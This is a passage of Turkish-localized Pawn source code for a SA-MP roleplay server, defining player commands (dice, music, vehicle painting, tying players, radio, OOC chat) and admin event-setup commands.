		if(sscanf(params, "u", iTarget)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /numara [Oyuncu ID/Ýsim]");
		}
		else if(IsPlayerConnected(iTarget)) {
			new
				szNumber[16 + MAX_PLAYER_NAME];

			format(szNumber, sizeof(szNumber), "* %s (%i)", GetPlayerNameEx(iTarget), PlayerInfo[iTarget][pNumber]);
			SendClientMessage(playerid, COLOR_GRAD1, szNumber);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Telefon defterin yok.");
	return 1;
}

CMD:zarat(playerid, params[])
{
    new string[128];
    new dice = random(6)+1;
    if(PlayerInfo[playerid][pDice])
	{
        format(string, sizeof(string), "* %s zar atar ve %d gelir.", GetPlayerNameEx(playerid),dice);
        ProxDetector(5.0, playerid, string, COLOR_NG,COLOR_NG,COLOR_NG,COLOR_NG,COLOR_NG);
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD2, "Zarýn yok.");
        return 1;
    }
    return 1;
}

CMD:muzik(playerid, params[])
{
	if(PlayerInfo[playerid][pCDPlayer])
	{
		new choice[32];
		if(sscanf(params, "s[32]", choice))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /muzik [name]");
			SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Açýk, Kapalý, Ileri");
			return 1;
		}

		if(strcmp(choice,"on",true) == 0)
		{
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~g~CD Çalar Açýk", 5000, 5);
			new channel = Music[playerid];
			PlayerPlaySound(playerid, Songs[channel][0], 0.0, 0.0, 0.0);
		}
		else if(strcmp(choice,"off",true) == 0)
		{
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~r~CD Çalar Kapalý", 5000, 5);
			PlayerFixRadio(playerid);
		}
		else if(strcmp(choice,"next",true) == 0)
		{
			if(Music[playerid] == 0) { Music[playerid] = 1; }
			else if(Music[playerid] == 1) { Music[playerid] = 2; }
			else if(Music[playerid] == 2) { Music[playerid] = 3; }
			else if(Music[playerid] == 3) { Music[playerid] = 4; }
			else if(Music[playerid] == 4) { Music[playerid] = 5; }
			else if(Music[playerid] == 5) { Music[playerid] = 6; }
			else if(Music[playerid] == 6) { Music[playerid] = 0; }
			new channel = Music[playerid];
			PlayerPlaySound(playerid, Songs[channel][0], 0.0, 0.0, 0.0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Bilinmeyen müzik komutu!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   CD-Çalarýn yok!");
		return 1;
	}
	return 1;
}

CMD:araciboya(playerid, params[]) {
	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "Araçta deðilsin.");

	if(PlayerInfo[playerid][pSpraycan] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Sprey kutun boþ.");

	if(GetPlayerVehicleSeat(playerid) != 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Aracý boyamak için þoför olmalýsýn.");

	new
		iVeh = GetPlayerVehicleID(playerid);
	if(IsAnAmbulance(iVeh) || IsAFBICar(iVeh) || IsANewsVeh(iVeh))
		return SendClientMessage(playerid, COLOR_GREY, "Kuruluþ araçlarýný boyayamazsýn.");



	new
		iColors[2],
		iPlayerVeh;

	if(sscanf(params, "ii", iColors[0], iColors[1]))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /araciboya [ID 1] [ID 2]. Colors must be an ID.");

	if(!(0 <= iColors[0] <= 255 && 0 <= iColors[1] <= 255))
		return SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz renk belirlendi (ID 0 ile 255 arasý olmalý).");

	foreach(Player, i) {
		iPlayerVeh = GetPlayerVehicle(i, iVeh);
		if(iPlayerVeh != -1) {
			if(i == playerid) PlayerVehicleInfo[playerid][iPlayerVeh][pvColor1] = iColors[0], PlayerVehicleInfo[playerid][iPlayerVeh][pvColor2] = iColors[1];
			else return SendClientMessage(playerid,COLOR_GREY,"Baþkalarýnýn arabasýný boyayamazsýn.");
		}
	}

	new
		szMessage[60];

	PlayerInfo[playerid][pSpraycan]--;
	format(szMessage, sizeof(szMessage), "Arabanýn rengini ID %d, %d yaptýn.", iColors[0], iColors[1]);
	SendClientMessage(playerid, COLOR_GRAD2, szMessage);
	return ChangeVehicleColor(iVeh, iColors[0], iColors[1]);
}

CMD:boyaisi(playerid, params[]) {
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /boyaisi [0-6] (3 to remove a paintjob)");

	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "Araçta deðilsin.");

	if(PlayerInfo[playerid][pSpraycan] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Sprey kutun boþ.");

	if(GetPlayerVehicleSeat(playerid) != 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "Aracý boyamak için þoför olmalýsýn.");

	new
		iVeh = GetPlayerVehicleID(playerid),
		iPaintID = strval(params),
		iPlayerVeh;

	if(IsAnAmbulance(iVeh) || IsACopCar(iVeh) || IsAFBICar(iVeh) || IsANewsVeh(iVeh))
		return SendClientMessage(playerid, COLOR_GREY, "Kuruluþ araçlarýný boyayamazsýn.");

	if(!(0 <= iPaintID <= 6)) {
		return SendClientMessage(playerid, COLOR_GRAD2, "Belirlenen boya iþi ID 0-6 arasý olmalý.");
	}
	foreach(Player, i) {
		iPlayerVeh = GetPlayerVehicle(i, iVeh);
		if(iPlayerVeh != -1) {
			if(i == playerid) PlayerVehicleInfo[playerid][iPlayerVeh][pvPaintJob] = iPaintID;
			else return SendClientMessage(playerid,COLOR_GREY,"Baþkalarýnýn aracýný boyayamazsýn.");
		}
	}

	ChangeVehiclePaintjob(iVeh, iPaintID);
	PlayerInfo[playerid][pSpraycan]--;
	return SendClientMessage(playerid, COLOR_GRAD2, "Boyayý baþarýyla aracýna uyguladýn.");
}

CMD:bagla(playerid, params[])
{
	if(PlayerInfo[playerid][pRope] > 0)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bagla [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerTied[giveplayerid] > 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Oyuncu zaten baðlý!");
				return 1;
			}
			if(PlayerCuffed[giveplayerid] != 0) return SendClientMessage(playerid, COLOR_GREY, "Kelepçeli/þoklu oyuncuyu baðlayamazsýn.");
			if(PlayerInfo[giveplayerid][pJailed] >= 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Hapisteki oyuncuyu baðlayamazsýn.");
				return 1;
			}
			if(PlayerInfo[playerid][pRope] == 0)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Hiç ipin kalmamýþ.");
			}
			else
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					new car = GetPlayerVehicleID(playerid);
					if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendini baðlayamazsýn!"); return 1; }
					if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(giveplayerid, car))
					{
						if(PlayerCuffed[giveplayerid] == 1 || PlayerCuffed[giveplayerid] == 2) {
							SendClientMessage(playerid, COLOR_GRAD2, "Þu an bunu yapamazsýn.");
							return 1;
						}

						format(string, sizeof(string), "* %s seni baðladý, çözülene kadar baðlýsýn.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s kiþisini baðladýn, çözülene kadar baðlý kalacak.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s , %s adlý kiþiyi baðladý, hiçbir yere gidemez.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						GameTextForPlayer(giveplayerid, "~r~Tied", 2500, 3);
						SetPVarInt(giveplayerid, "IsFrozen", 1);
						TogglePlayerControllable(giveplayerid, 0);
						PlayerTied[giveplayerid] = 1;
						PlayerInfo[playerid][pRope]--;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   Oyuncu arabanda deðil, ya da þoför deðilsin!");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
					return 1;
				}
			}

		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Ipin yok!");
	}
	return 1;
}

CMD:coz(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /coz [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendini çözemezsin!"); return 1; }
			if(PlayerCuffed[giveplayerid] != 0) return SendClientMessage(playerid, COLOR_GREY, "Kelepçeli/þoklu oyuncuyu çözemezsin.");
			if(PlayerTied[giveplayerid])
			{
				DeletePVar(giveplayerid, "IsFrozen");
				format(string, sizeof(string), "* %s seni çözdü.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* %s kiþisini çözdün.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GameTextForPlayer(giveplayerid, "~g~Çözülü", 2500, 3);
				TogglePlayerControllable(giveplayerid, 1);
				PlayerTied[giveplayerid] = 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Bu oyuncu baðlý deðil!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		return 1;
	}
	return 1;
}

CMD:sigara(playerid, params[]) {
	if(PlayerInfo[playerid][pCigar] > 0) {
		if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");

		new string[128];
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
		format(string, sizeof(string), "* %s bir sigara çýkarýp yakar.", GetPlayerNameEx(playerid));
		ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		PlayerInfo[playerid][pCigar]--;
	}
	else SendClientMessage(playerid, COLOR_GREY, "Hiç sigaran yok, 24/7'den biraz satýn al!");

	return 1;
}

CMD:gazozic(playerid, params[])
{
	if(PlayerInfo[playerid][pSprunk] > 0) {
		if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");

		if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
			return SendClientMessage(playerid, COLOR_GRAD2, "Etkinlikteyken iyileþtiremezsin!");

		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
			return SendClientMessage(playerid, COLOR_WHITE, "Gazoz içmek için ayakta durman gerekiyor.");

		if(IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_WHITE, "Araçtayken bunu yapamazsýn.");

		if(GetPlayerState(playerid) == PLAYER_STATE_ENTER_VEHICLE_DRIVER || GetPlayerState(playerid) == PLAYER_STATE_ENTER_VEHICLE_PASSENGER || GetPlayerState(playerid) == PLAYER_STATE_EXIT_VEHICLE)
			return SendClientMessage(playerid, COLOR_WHITE, "Araçtayken bunu yapamazsýn.");

		new string[128];
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
		format(string, sizeof(string), "* %s bir kutu gazoz açar.", GetPlayerNameEx(playerid));
		ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPVarInt(playerid, "UsingSprunk", 1);
		PlayerInfo[playerid][pSprunk]--;
		return 1;
	}
	else return SendClientMessage(playerid, COLOR_GREY, "Hiç gazozun yok, 24/7'den biraz satýn al!");
}

CMD:pr(playerid, params[]) {
	if(PlayerInfo[playerid][pRadio] == 1) {
		if(isnull(params))
		    return SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /pr [chat message] (use /frekans to set your radio frequency)");

		if(PlayerInfo[playerid][pRadioFreq] >= 1 || PlayerInfo[playerid][pRadioFreq] <= -1) {
			if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0 || PlayerInfo[playerid][pJailTime] > 0)
				return SendClientMessage (playerid, COLOR_GRAD2, "Bunu þu an yapamazsýn.");

			RadioBroadCast(playerid, params);
		} else SendClientMessage(playerid, COLOR_GRAD2, "Radyo frekansýn 0 olarak ayarlý, bu frekanstan yayýn yapamazsýn.");
	} else SendClientMessage(playerid, COLOR_GRAD2, "Portatif radyon yok, 24/7'den alabilirsin.");
	return 1;
}

CMD:frekans(playerid, params[]) {
	new
		string[128],
		frequency;

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /frekans [frequency] ('0' will disable your portable radio)");

	frequency = strval(params);

	if(frequency > 9999999 || frequency < -9999999)
		return SendClientMessage(playerid, COLOR_GREY, "Frekans -9999999 ile 9999999 arasýnda olmalý!");

	if(PlayerInfo[playerid][pRadio] == 1) {
		PlayerInfo[playerid][pRadioFreq] = frequency;
		format(string, sizeof(string), "Portatif radyonun frekansýný %d kHz olarak ayarladýn.",frequency);
		SendClientMessage(playerid, COLOR_WHITE, string);
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Portatif bir radyon yok, 24/7'den alabilirsin.");
	return 1;
}

CMD:noooc(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(!noooc)
		{
			noooc = 1;
			SendClientMessageToAllEx(COLOR_GRAD2, "   OOC Sohbet Kanalý Admin tarafýndan kapatýldý!");
		}
		else
		{
			noooc = 0;
			SendClientMessageToAllEx(COLOR_GRAD2, "   OOC Sohbet Kanalý Admin tarafýndan açýldý!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:ss(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");
		return 1;
	}
	if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ss [text]");
	else if(PlayerInfo[playerid][pHelper] >= 2 || PlayerInfo[playerid][pAdmin] >= 1)
	{
		new
			string[128];
		format(string, sizeof(string), "Sokaktan Sesler: %s", params);
		SendClientMessageToAllEx(COLOR_GREY,string);
	}
	return 1;
}

CMD:o(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");
		return 1;
	}
	if((noooc) && PlayerInfo[playerid][pAdmin] < 1 && EventInfo[EventCreator] != playerid)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "    OOC Kanalý Admin tarafýndan kapatýldý!");
		return 1;
	}
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/o)oc [ooc chat]");

	else if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		new
			string[128];

		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			format(string, sizeof(string), "(( {FF6347}Level %d Admin %s: {FFFFFF}%s ))", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid), params);
			SendClientMessageToAllEx(COLOR_OOC,string);
		}

	}
	else if(PlayerInfo[playerid][pAdmin] < 1)
	{
		new
			string[128];

		format(string, sizeof(string), "(( %s: %s ))", GetPlayerNameEx(playerid), params);
		SendClientMessageToAllEx(COLOR_OOC,string);
		return 1;
	}
	return 1;
}

CMD:ao(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");
		return 1;
	}
	if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ao [text]");
		
	else if(PlayerInfo[playerid][pAdmin] >= 10)
	{
		new
			string[128];
		format(string, sizeof(string), "(( {00FFEB}Server Owner %s: {FFFFFF}%s ))", GetPlayerNameEx(playerid), params);
		SendClientMessageToAllEx(COLOR_WHITE,string);
	}
	return 1;
}

CMD:eventhelp(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 6 || EventInfo[EventCreator] == playerid)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		SendClientMessage(playerid, COLOR_GRAD4,"*** ETKINLIK YARDIM *** daha çok bilgi için komut yaz");
		SendClientMessage(playerid, COLOR_WHITE,"*** ETKINLIK YARDIM *** /seteventpos /seteventinfo /startevent /lockevent /endevent /announceevent /beginevent");
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	}
	return 1;
}

CMD:eventstaff(playerid, params[])
{
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
	}

    if(PlayerInfo[playerid][pAdmin] >= 1)
	{
        if(EventInfo[EventJoinStaff] == 1) {
            for(new i; i < sizeof(EventInfo[EventStaff]); i++) if(EventInfo[EventStaff][i] == 999) {
                SetPVarInt(playerid, "EventToken", 1);
                GetPlayerHealth(playerid, EventFloats[playerid][4]);
                GetPlayerArmour(playerid, EventFloats[playerid][5]);
                EventLastVW[playerid] = GetPlayerVirtualWorld(playerid);
                EventLastInt[playerid] = GetPlayerInterior(playerid);
                GetPlayerPos(playerid, EventFloats[playerid][1], EventFloats[playerid][2], EventFloats[playerid][3]);
                GetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
                SetPlayerPos(playerid, EventInfo[EventPositionX], EventInfo[EventPositionY], EventInfo[EventPositionZ]);
                SetPlayerInterior(playerid, EventInfo[EventInterior]);
                SetPlayerHealth(playerid, 999999);
                SetPlayerVirtualWorld(playerid, EventInfo[EventWorld]);
                GivePlayerValidAdminWeapon(playerid, 38, 60000);
                EventInfo[EventStaff][i] = playerid;
                return SendClientMessage(playerid, COLOR_WHITE, "Etkinlik personeline katýldýn.");
            }
            SendClientMessage(playerid, COLOR_GRAD2, "Etkinlik personeline katýlamadýn, maksimum 5 kiþi.");
        }
    }
    return 1;
}

CMD:seteventpos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
		{
			new string[128];

			GetPlayerPos(playerid, EventInfo[EventPositionX], EventInfo[EventPositionY], EventInfo[EventPositionZ]);
			EventInfo[EventInterior] = GetPlayerInterior(playerid);
			EventInfo[EventWorld] = GetPlayerVirtualWorld(playerid);
			SendClientMessage(playerid, COLOR_WHITE, "Etkinlik pozisyonunu ayarladýn, etkinlik özelliklerini deðiþtirmek için /seteventinfo.");
			EventInfo[EventJoinStaff] = 1;
			format(string, sizeof(string), "{AA3333}AdminUyarý{FFFF00}: %s etkinlik baþlattý, /eventstaff yazarak etkinlik personeline katýlabilirsin.", GetPlayerNameEx(playerid));
			ABroadCast(COLOR_YELLOW, string, 1);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Etkinlik yapmýyorsun, ya da yeterli admin levelin yok.");
		}
	}
	return 1;
}

CMD:seteventinfo(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
		{   // No VIP yet
			//SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /seteventtype /editevent /seteventviponly (once ready, type /startevent)");
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /seteventtype /editevent (once ready, type /startevent)");
			return 1;
		}
	}
	return 1;
}

CMD:atip(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
		    iTarget;

		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /atip [playerid]");

		if(iTarget == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(playerTabbedTime[iTarget] <= 0)
		    return SendClientMessage(playerid, COLOR_GREY, "Belirlenen oyuncu alt-tab yapmamýþ, ýþýnlayabilirsin.");

        playerTabbedTime[iTarget] = 3599;

        new
            szMessage[86];

		format(szMessage, sizeof(szMessage), "%s oyuncusunu genel alanda alt-tab yaptýðý için uzaða ýþýnladýn.", GetPlayerNameEx(iTarget));
		SendClientMessage(playerid, COLOR_WHITE, szMessage);
 	}
	return 1;
}

CMD:seteventtype(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
		{
			if(isnull(params))
			{
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /seteventtype [type]");
				SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: DM, TDM");
				return 1;
			}

			if(strcmp(params,"dm",true) == 0) {
				EventInfo[EventType] = 1;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik türünü DM olarak ayarladýn.");
			} else if(strcmp(params,"tdm",true) == 0) {
				EventInfo[EventType] = 2;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik türünü TDM olarak ayarladýn.");
			} else if(strcmp(params,"Yok",true) == 0) {
				EventInfo[EventType] = 0;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik türünü Yok olarak ayarladýn.");
			} else { }
		}
	}
	return 1;
}

CMD:editevent(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(PlayerInfo[playerid][pAdmin] >= 4 || EventInfo[EventCreator] == playerid)
		{
			new choice[32], opstring[64];
			if(EventInfo[EventType] == 1)
			{
			    if(sscanf(params, "s[32]S()[64]", choice, opstring))
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent [name]");
					SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Jointext, Limit, Health, Armor, Gun1, Gun2, Gun3, Gun4, Gun5");
					SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Faction, Family, Heal, Anims");
					return 1;
				}
			}
			else if(EventInfo[EventType] == 2)
			{
			    if(sscanf(params, "s[32]S()[64]", choice, opstring))
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent [name]");
					SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Jointext, Limit, Team1Skin, Team2Skin, Team1Color, Team2Color");
					SendClientMessage(playerid, COLOR_GREY, "Team1Spawn, Team2Spawn, Health, Armor, Gun1, Gun2, Gun3, Gun4, Gun5, Faction, Family, Heal, Anims");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Önce etkinlik tipini ayarlamalýsýn!");
				return 1;
			}

			if(strcmp(choice, "jointext",true) == 0)
			{
				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent jointext [text]");
					return 1;
				}
				strmid(EventInfo[EventJT], opstring, 0, strlen(opstring), 64);
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik katýlma metnini baþarýyla ayarladýn.");
			}
			else if(strcmp(choice, "family",true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent family [family (1337 = all families, 255 = default)]");
					return 1;
				}

				new family;
				family = strval(opstring);
				if(EventInfo[EventFamily] != 1337 || EventInfo[EventFamily] != 255) EventInfo[EventFamily] = (family - 1);
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik ailesini ayarladýn.");
			}
			else if(strcmp(choice, "heal",true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent heal [1 = yes, 0 = no]");
					return 1;
				}

				new healval;
				healval = strval(opstring);
				EventInfo[EventToggleHeal] = healval;
				if(healval == 0) SendClientMessage(playerid, COLOR_WHITE, "Etkinliklerde iyileþtirmeyi aktifleþtirdin.");
				else if(healval == 1) SendClientMessage(playerid, COLOR_WHITE, "Etkinliklerde iyileþtirmeyi kapattýn.");
				else return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz deðer, 1 = Iyileþtirme yok ve 0 = Iyileþtirme açýk.");
			}
			else if(strcmp(choice, "anims",true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent anims [1 = yes, 0 = no]");
					return 1;
				}

				new animsval;
				animsval = strval(opstring);
				EventInfo[EventToggleAnims] = animsval;
				if(animsval == 0) SendClientMessage(playerid, COLOR_WHITE, "Etkinliklerde animasyon kullanýmýný açtýn.");
				else if(animsval == 1) SendClientMessage(playerid, COLOR_WHITE, "Etkinliklerde animasyon kullanýmýný kapattýn.");
				else return SendClientMessage(playerid, COLOR_WHITE, "Geçersiz deðer, 1 = Animasyon yok  0 = Animasyon açýk.");
			}
			else if(strcmp(choice, "faction",true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent faction [faction (1337 = all factions, 0 = default)]");
					return 1;
				}

				new faction;
				faction = strval(opstring);
				EventInfo[EventFaction] = faction;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik kuruluþunu ayarladýn.");
			}
			else if(strcmp(choice, "health", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1 && EventInfo[EventType] != 3)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent health [health]");
					return 1;
				}
				new Float: health;
				health = floatstr(opstring);
				EventInfo[EventHealth] = health;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik iyileþtirmesini ayarladýn.");
			}
			else if(strcmp(choice, "armor", true) == 0)
			{
				if(EventInfo[EventType] != 2 && EventInfo[EventType] != 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Bu isim bu etkinlik tipi için kullanýlabilir deðil.");
					return 1;
				}

				if(!opstring[0])
				{
					SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /editevent armor [armor]");
					return 1;
				}

				new Float: armor;
				armor = floatstr(opstring);
				EventInfo[EventArmor] = armor;
				SendClientMessage(playerid, COLOR_WHITE, "Etkinlik zýrhýný ayarladýn.");
			}
			else if(strcmp(choice, "team1skin", true) == 0)
			{
				if(EventInfo[EventType] != 2)
				{
